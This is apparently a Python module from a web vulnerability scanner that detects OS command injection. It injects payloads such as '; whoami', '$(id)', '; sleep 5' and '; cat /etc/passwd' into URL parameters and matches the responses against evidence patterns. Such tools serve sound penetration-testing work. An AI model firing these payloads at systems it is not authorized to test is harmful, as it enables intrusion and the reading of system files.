"""
Command Injection Scanner Module
Detects OS command injection vulnerabilities
"""

import requests
import urllib.parse
from typing import List, Dict, Any
import time
import logging

logger = logging.getLogger(__name__)


class CommandInjectionScanner:
    """
    Command Injection vulnerability scanner
    Tests for OS command injection using various techniques
    """
    
    # Command injection payloads for different OS
    CMD_PAYLOADS = [
        # Unix/Linux command separators
        "; whoami",
        "| whoami",
        "|| whoami",
        "& whoami",
        "&& whoami",
        "`whoami`",
        "$(whoami)",
        "; id",
        "| id",
        "&& id",
        
        # Windows command separators
        "& whoami",
        "&& whoami",
        "| whoami",
        "|| whoami",
        
        # Time-based detection (blind)
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "; ping -c 5 127.0.0.1",
        "& ping -n 5 127.0.0.1",
        
        # File read attempts
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "& type C:\\windows\\win.ini",
        
        # Command substitution
        "`id`",
        "$(id)",
        "`whoami`",
        "$(whoami)"
    ]
    
    # Evidence patterns to look for in responses
    EVIDENCE_PATTERNS = [
        r"uid=\d+",  # Unix user ID
        r"gid=\d+",  # Unix group ID
        r"root:",    # /etc/passwd content
        r"daemon:",  # /etc/passwd content
        r"\\windows\\",  # Windows paths
        r"C:\\",     # Windows drive
        r"for 16-bit app support",  # win.ini content
    ]
    
    def __init__(self, timeout: int = 10):
        """
        Initialize Command Injection Scanner
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_url(self, url: str, params: Dict[str, str] = None, method: str = "GET") -> List[Dict[str, Any]]:
        """
        Scan URL for command injection vulnerabilities
        
        Args:
            url: Target URL
            params: URL parameters or POST data
            method: HTTP method
            
        Returns:
            List of detected command injection vulnerabilities
        """
        vulnerabilities = []
        
        if not params:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if not params:
            logger.warning(f"No parameters found for {url}")
            return vulnerabilities
        
        logger.info(f"Testing command injection on {url} with {len(params)} parameters")
        
        # Test each parameter
        for param_name in params.keys():
            # Test standard command injection
            vulns = self._test_command_injection(url, params, param_name, method)
            vulnerabilities.extend(vulns)
            
            # Test blind/time-based command injection
            if not vulns:  # Only test time-based if standard test didn't find anything
                time_vulns = self._test_time_based_injection(url, params, param_name, method)
                vulnerabilities.extend(time_vulns)
        
        return vulnerabilities
    
    def _test_command_injection(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test for standard command injection"""
        vulnerabilities = []
        
        for payload in self.CMD_PAYLOADS:
            # Skip time-based payloads in this test
            if 'sleep' in payload.lower() or 'ping' in payload.lower():
                continue
            
            test_params = params.copy()
            original_value = test_params[param_name]
            test_params[param_name] = f"{original_value}{payload}"
            
            try:
                if method.upper() == "POST":
                    response = self.session.post(url, data=test_params, timeout=self.timeout, verify=False)
                else:
                    response = self.session.get(url, params=test_params, timeout=self.timeout, verify=False)
                
                # Check for command output in response
                if self._check_command_output(response.text):
                    vulnerabilities.append({
                        'type': 'OS Command Injection',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'evidence': self._extract_command_evidence(response.text),
                        'status_code': response.status_code,
                        'response_snippet': response.text[:500]
                    })
                    logger.warning(f"✗ Command Injection detected in {param_name}")
                    return vulnerabilities  # Found vulnerability
            
            except Exception as e:
                logger.debug(f"Error testing command injection: {e}")
        
        return vulnerabilities
    
    def _test_time_based_injection(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test for blind/time-based command injection"""
        vulnerabilities = []
        
        time_payloads = [
            "; sleep 5",
            "| sleep 5", 
            "&& sleep 5",
            "& ping -n 5 127.0.0.1",
            "; ping -c 5 127.0.0.1"
        ]
        
        for payload in time_payloads:
            test_params = params.copy()
            original_value = test_params[param_name]
            test_params[param_name] = f"{original_value}{payload}"
            
            try:
                start_time = time.time()
                
                if method.upper() == "POST":
                    response = self.session.post(url, data=test_params, timeout=15, verify=False)
                else:
                    response = self.session.get(url, params=test_params, timeout=15, verify=False)
                
                elapsed = time.time() - start_time
                
                # If response took significantly longer (4+ seconds), likely vulnerable
                if elapsed > 4:
                    vulnerabilities.append({
                        'type': 'OS Command Injection (Time-Based Blind)',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'evidence': f"Response delayed by {elapsed:.2f} seconds",
                        'status_code': response.status_code,
                        'response_snippet': response.text[:500]
                    })
                    logger.warning(f"✗ Time-based Command Injection detected in {param_name}")
                    return vulnerabilities
            
            except requests.exceptions.Timeout:
                logger.info(f"Timeout occurred - possible time-based command injection in {param_name}")
            except Exception as e:
                logger.debug(f"Error testing time-based injection: {e}")
        
        return vulnerabilities
    
    def _check_command_output(self, response_text: str) -> bool:
        """
        Check if response contains evidence of command execution
        
        Args:
            response_text: HTTP response body
            
        Returns:
            bool: True if command output detected
        """
        import re
        
        for pattern in self.EVIDENCE_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def _extract_command_evidence(self, response_text: str) -> str:
        """Extract evidence of command execution from response"""
        import re
        
        for pattern in self.EVIDENCE_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 150)
                return response_text[start:end]
        
        return "Command execution evidence detected"


# Example usage
if __name__ == "__main__":
    scanner = CommandInjectionScanner()
    
    test_url = "https://example.com/ping"
    test_params = {"host": "127.0.0.1"}
    
    vulnerabilities = scanner.scan_url(test_url, test_params)
    
    print(f"\nFound {len(vulnerabilities)} command injection vulnerabilities:")
    for vuln in vulnerabilities:
        print(f"  - {vuln['type']} in parameter '{vuln['parameter']}'")
